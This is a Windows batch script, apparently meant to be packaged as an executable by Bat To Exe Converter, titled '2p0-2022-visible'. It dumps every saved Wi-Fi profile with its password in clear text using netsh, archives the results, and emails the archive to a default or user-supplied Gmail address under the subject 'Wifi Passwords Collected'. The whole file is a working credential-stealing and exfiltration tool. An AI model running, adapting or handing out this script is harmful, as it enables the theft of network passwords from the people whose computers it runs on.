::[Bat To Exe Converter]
::
::fBE1pAF6MU+EWHreyHcjLQlHcCWRKXiGKbsZzPry+e+78F1NFOA+a4bYyYjcELBT2EDyfIAo0joX2JlcXklkchupaw4t+jwMsmiJVw==
::fBE1pAF6MU+EWHreyHcjLQlHcCWRKXiGKbsZzPry+e+78F1NFOA+a4bYyYjcELBT2EDyfIAo0joX2JlcXklkUxOiYi44rHxW+GGdMqc=
::fBE1pAF6MU+EWHreyHcjLQlHcCWRKXiGKbsZzPry+e+78F1NFOA+a4bYyYjcELBT2EDyfIAo0joX2JlcXklkUxOiYi44rHxW+G2LPqc=
::fBE1pAF6MU+EWHreyHcjLQlHcCWRKXiGKbsZzPry+e+78F1NFOA+a4bYyYjcELBT2EDyfIAo0joX2JlcXklkbQGnaw4t+jwMsmiJVw==
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJGyX8VAjFDpHWRe+GGStCLkT6ezo09yukQMUV+1f
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSDk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpSI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJGyX8VAjFDpHWRe+E2W/IqcV/u3Hy++UqVkSRN5taN+WiOTccq1BqnPNRtgozn86
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
mode con cols=70 lines=25
color 0B
title 2p0-2022-visible

:home
cls
echo     .*oO######Oo°      o#OOOOOOOOOOOo*.       .*O######o*      
echo     o@@@@@@@@@@@@#.    #@@@@@@@@@@@@@@@#°    O@@@@@@@@@@@@*    
echo     o@Oo***O@@@@@@#    O@@@@@@**oO@@@@@@@°  #@@@@@O°*@@@@@@*   
echo     .       #@@@@@#    O@@@@@@    O@@@@@@o o@@@@@@   o@@@@@@   
echo           .O@@@@@@°    O@@@@@@. .°#@@@@@@° #@@@@@O   °@@@@@@.  
echo        .*#@@@@@@O.     O@@@@@@@@@@@@@@@@°  @@@@@@o   °@@@@@@.  
echo      °O@@@@@@O°        O@@@@@@@@@@@@#o°    #@@@@@O   *@@@@@@.  
echo     o@@@@@#*.          O@@@@@@....         o@@@@@@.  #@@@@@O   
echo    *@@@@@@@#@@@@@@@.   O@@@@@@              #@@@@@#o#@@@@@#    
echo    O@@@@@@@@@@@@@@@.   #@@@@@@               *#@@@@@@@@@#*     
echo    °***************    °******                 .**ooo**.        
echo ..................................................................
echo 2p0-2022-visible         By Kasunhapangama          %date%
echo ..................................................................
echo press number and enter
echo [1] Extract Data
echo [2] Exit
set /p type=
if %type%==1 goto wifiexport
if %type%==2 goto exit



:wifiexport
cls
mkdir wifi%username%
netsh wlan export profile folder=wifi%username% key=clear
netsh wlan show profiles>wifi%username%\body.txt
echo ...........................................
echo Wifi Data Exported Successfully! (Please Wait..)
echo ...........................................
timeout /t 3
goto done

:done
cls
echo ...........................................
echo Wifi data Extracted to [wifi%username%] folder
echo ...........................................
echo press number and enter
echo [1] Open Folder
echo [2] Send Data To Email
echo [3] back
set /p type=
if %type%==1 goto folder
if %type%==2 goto email
if %type%==3 goto home


:folder
cls
start %windir%\explorer.exe "wifi%username%"
goto done

:email
cls
tar -czvf wifi%username%.tar wifi%username%
echo ...........................................
echo Data Archived (Please Wait..)
echo ...........................................
timeout /t 1
goto email2


:email2
cls
echo ...........................................
echo Select your Email
echo ...........................................
echo [1] Default Gmail
echo [2] Custom Gmail
echo [3] back
set /p type=
if %type%==1 goto demail
if %type%==2 goto cemail
if %type%==3 goto done


:demail
MailAlert -s "Wifi Passwords Collected - %username%" -b "@wifi%username%\body.txt" -a "wifi%username%.tar" -d
echo ...........................................
echo Remember to Check Your Spam Folder
echo ...........................................
pause
goto done

:cemail
echo ...........................................
echo Enter your Gmail Address
echo ...........................................
echo eg :- testing123@gmail.com
set /p mail1=
MailAlert -r "%mail1%" -s "Wifi Passwords Collected - %username%" -b "@wifi%username%\body.txt" -a "wifi%username%.tar" -d 
echo ...........................................
echo Remember to Check Your Spam Folder
echo ...........................................
pause
goto done



:exit
cls
exit